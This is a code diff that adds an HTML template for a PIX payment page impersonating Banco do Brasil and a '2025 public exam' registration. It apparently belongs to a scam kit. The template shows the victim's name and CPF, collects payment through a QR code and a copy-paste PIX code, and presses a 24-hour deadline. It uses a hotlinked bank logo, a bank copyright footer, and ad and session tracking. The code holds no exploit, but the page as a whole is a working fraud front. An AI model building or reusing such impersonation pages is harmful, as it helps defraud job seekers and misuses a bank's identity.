@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco do Brasil - Pagamento PIX</title>
+
+    <!-- Meta Pixel Code -->
+    {% if pixel_id %}
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', '{{ pixel_id }}');
+    fbq('track', 'PageView');
+    fbq('track', 'InitiateCheckout');
+    </script>
+    <noscript>
+    <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id={{ pixel_id }}&ev=PageView&noscript=1"/>
+    </noscript>
+    {% endif %}
+    <!-- End Meta Pixel Code -->
+
+    <!-- Microsoft Clarity Analytics -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "tcndd6162u");
+    </script>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            overflow-x: hidden;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+        .card-shadow {
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .pix-code-container {
+            background: linear-gradient(145deg, #ffffff, #f1f5f9);
+            border: 2px solid #e2e8f0;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.06);
+        }
+        .pix-code {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.4;
+            color: #374151;
+            word-break: break-all;
+        }
+        .copy-success {
+            background-color: #10b981 !important;
+            transform: scale(0.98);
+            transition: all 0.2s ease;
+        }
+        .qr-code-container {
+            background: linear-gradient(145deg, #ffffff, #f8fafc);
+            border: 1px solid #e5e7eb;
+        }
+        .warning-card {
+            background: linear-gradient(145deg, #fef3c7, #fcd34d);
+            border-left: 4px solid #f59e0b;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'bb-yellow': '#FEEF37',
+                        'bb-blue': '#003DA5',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <div class="bg-bb-yellow py-4 shadow-sm">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <div>
+                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                        CONCURSO PÚBLICO 2025
+                    </p>
+                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue bar -->
+    <div class="bg-bb-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">PAGAMENTO PIX</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8 flex-grow">
+        <div class="max-w-5xl mx-auto">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 lg:gap-6">
+                <!-- Coluna esquerda - Informações e QR Code -->
+                <div class="space-y-6">
+                    <!-- Dados do pagamento -->
+                    <div class="bg-white rounded-xl p-6 card-shadow">
+                        <div class="border-b border-gray-200 pb-4 mb-4">
+                            <h3 class="text-lg font-semibold text-gray-800">Detalhes do Pagamento</h3>
+                        </div>
+                        <div class="space-y-3">
+                            <div class="flex justify-between items-center">
+                                <span class="text-gray-600">Beneficiário:</span>
+                                <span class="font-semibold text-gray-800">{{ dados.name }}</span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-gray-600">CPF:</span>
+                                <span class="font-semibold text-gray-800">{{ '{}.{}.{}-{}'.format(dados.cpf[:3], dados.cpf[3:6], dados.cpf[6:9], dados.cpf[9:]) }}</span>
+                            </div>
+                            <div class="flex justify-between items-center border-t border-gray-100 pt-3">
+                                <span class="text-gray-600">Valor a Pagar:</span>
+                                <span class="text-2xl font-bold text-bb-blue">R$ {{ valor_total }}</span>
+                            </div>
+                            {% if pix_data.transaction_id %}
+                            <div class="flex justify-between items-center text-sm">
+                                <span class="text-gray-500">ID da Transação:</span>
+                                <span class="font-mono text-gray-700">{{ pix_data.transaction_id }}</span>
+                            </div>
+                            {% endif %}
+                        </div>
+                    </div>
+
+                    <!-- QR Code -->
+                    <div class="bg-white rounded-xl p-6 card-shadow text-center">
+                        <div class="border-b border-gray-200 pb-4 mb-6">
+                            <h3 class="text-lg font-semibold text-gray-800 flex items-center justify-center">
+                                <i class="fas fa-qrcode mr-2 text-bb-blue"></i>
+                                QR Code PIX
+                            </h3>
+                        </div>
+                        {% if pix_data.qr_code %}
+                        <div class="qr-code-container rounded-lg p-6 mb-4 inline-block">
+                            <div id="qrcode" class="flex justify-center"></div>
+                        </div>
+                        <p class="text-sm text-gray-600">
+                            Abra o app do seu banco e escaneie o código acima
+                        </p>
+                        {% else %}
+                        <div class="bg-gray-100 w-64 h-64 mx-auto flex items-center justify-center mb-4 rounded-lg">
+                            <i class="fas fa-exclamation-triangle text-gray-400 text-4xl"></i>
+                        </div>
+                        <p class="text-red-600">QR Code não disponível</p>
+                        {% endif %}
+                    </div>
+                </div>
+
+                <!-- Coluna direita - Código PIX e Instruções -->
+                <div class="space-y-6">
+                    <!-- Código Copia e Cola -->
+                    <div class="bg-white rounded-xl p-6 card-shadow">
+                        <div class="border-b border-gray-200 pb-4 mb-6">
+                            <h3 class="text-lg font-semibold text-gray-800 flex items-center">
+                                <i class="fas fa-copy mr-2 text-bb-blue"></i>
+                                Código PIX
+                            </h3>
+                        </div>
+                        {% if pix_data.pix_code %}
+                        <div class="pix-code-container rounded-lg p-4 mb-4">
+                            <div class="pix-code" id="pixCode">{{ pix_data.pix_code }}</div>
+                        </div>
+                        <button onclick="copyPixCode()" id="copyButton" class="w-full bg-bb-blue hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200 flex items-center justify-center space-x-2">
+                            <i class="fas fa-copy" id="copyIcon"></i>
+                            <span id="copyText">Copiar Código PIX</span>
+                        </button>
+                        {% else %}
+                        <p class="text-red-600">Código PIX não disponível</p>
+                        {% endif %}
+                    </div>
+
+                    <!-- Instruções -->
+                    <div class="bg-white rounded-xl p-6 card-shadow">
+                        <div class="border-b border-gray-200 pb-4 mb-4">
+                            <h3 class="text-lg font-semibold text-gray-800">Como Pagar</h3>
+                        </div>
+                        <ol class="space-y-3 text-gray-700">
+                            <li class="flex items-start">
+                                <span class="flex-shrink-0 w-6 h-6 bg-bb-blue text-white rounded-full flex items-center justify-center text-sm font-semibold mr-3 mt-0.5">1</span>
+                                <span>Abra o aplicativo do seu banco ou instituição financeira</span>
+                            </li>
+                            <li class="flex items-start">
+                                <span class="flex-shrink-0 w-6 h-6 bg-bb-blue text-white rounded-full flex items-center justify-center text-sm font-semibold mr-3 mt-0.5">2</span>
+                                <span>Acesse a área PIX</span>
+                            </li>
+                            <li class="flex items-start">
+                                <span class="flex-shrink-0 w-6 h-6 bg-bb-blue text-white rounded-full flex items-center justify-center text-sm font-semibold mr-3 mt-0.5">3</span>
+                                <span>Escaneie o QR Code ou cole o código PIX</span>
+                            </li>
+                            <li class="flex items-start">
+                                <span class="flex-shrink-0 w-6 h-6 bg-bb-blue text-white rounded-full flex items-center justify-center text-sm font-semibold mr-3 mt-0.5">4</span>
+                                <span>Confirme os dados e autorize a transação</span>
+                            </li>
+                        </ol>
+                    </div>
+
+                    <!-- Alerta de Prazo -->
+                    <div class="warning-card rounded-xl p-6">
+                        <div class="flex items-start">
+                            <i class="fas fa-exclamation-triangle text-amber-600 text-xl mt-0.5 mr-4 flex-shrink-0"></i>
+                            <div>
+                                <h4 class="font-bold text-amber-800 text-lg mb-2">Atenção: Prazo para Pagamento</h4>
+                                <p class="text-amber-700 leading-relaxed">
+                                    Este código PIX possui validade de <strong>24 horas</strong>. 
+                                    Após este período, será necessário gerar um novo código para efetuar o pagamento.
+                                </p>
+                                <p class="text-amber-700 mt-2 text-sm">
+                                    <i class="fas fa-clock mr-1"></i>
+                                    Recomendamos efetuar o pagamento o quanto antes para evitar inconvenientes.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    </div>
+
+    <script>
+        // Gerar QR Code quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+            {% if pix_data.qr_code %}
+            try {
+                // Criar QR Code usando qrcode-generator
+                const qr = qrcode(0, 'M');
+                qr.addData('{{ pix_data.qr_code }}');
+                qr.make();
+                
+                // Gerar HTML do QR Code
+                const qrCodeHtml = qr.createImgTag(4, 8);
+                document.getElementById('qrcode').innerHTML = qrCodeHtml;
+                
+                // Aplicar estilos ao QR Code
+                const img = document.querySelector('#qrcode img');
+                if (img) {
+                    img.style.border = '8px solid #003DA5';
+                    img.style.borderRadius = '8px';
+                    img.style.background = 'white';
+                }
+            } catch (error) {
+                console.error('Erro ao gerar QR Code:', error);
+                document.getElementById('qrcode').innerHTML = '<p class="text-red-600 text-sm">Erro ao gerar QR Code</p>';
+            }
+            {% endif %}
+        });
+
+        // Função para copiar código PIX
+        function copyPixCode() {
+            const pixCodeElement = document.getElementById('pixCode');
+            const copyButton = document.getElementById('copyButton');
+            const copyIcon = document.getElementById('copyIcon');
+            const copyText = document.getElementById('copyText');
+            
+            if (!pixCodeElement || !copyButton) {
+                console.error('Elementos não encontrados');
+                return;
+            }
+            
+            const pixCode = pixCodeElement.textContent.trim();
+            
+            // Usar clipboard API se disponível, senão usar fallback
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(pixCode).then(function() {
+                    showCopySuccess();
+                }).catch(function(err) {
+                    console.error('Erro ao copiar com clipboard API: ', err);
+                    fallbackCopy(pixCode);
+                });
+            } else {
+                fallbackCopy(pixCode);
+            }
+            
+            function showCopySuccess() {
+                // Salvar estado original
+                const originalIcon = copyIcon.className;
+                const originalText = copyText.textContent;
+                const originalClasses = copyButton.className;
+                
+                // Aplicar visual de sucesso
+                copyIcon.className = 'fas fa-check';
+                copyText.textContent = 'Código Copiado!';
+                copyButton.className = originalClasses.replace('bg-bb-blue', 'bg-green-600').replace('hover:bg-blue-700', 'hover:bg-green-700');
+                copyButton.classList.add('copy-success');
+                
+                // Restaurar após 2 segundos
+                setTimeout(function() {
+                    copyIcon.className = originalIcon;
+                    copyText.textContent = originalText;
+                    copyButton.className = originalClasses;
+                    copyButton.classList.remove('copy-success');
+                }, 2000);
+            }
+            
+            function fallbackCopy(text) {
+                // Fallback: criar elemento temporário para copiar
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-999999px';
+                textArea.style.top = '-999999px';
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                
+                try {
+                    const successful = document.execCommand('copy');
+                    if (successful) {
+                        showCopySuccess();
+                    } else {
+                        throw new Error('Comando de cópia falhou');
+                    }
+                } catch (err) {
+                    console.error('Erro no fallback de cópia: ', err);
+                    alert('Não foi possível copiar automaticamente. Por favor, selecione e copie o código manualmente.');
+                } finally {
+                    document.body.removeChild(textArea);
+                }
+            }
+        }
+    </script>
+</body>
+</html>
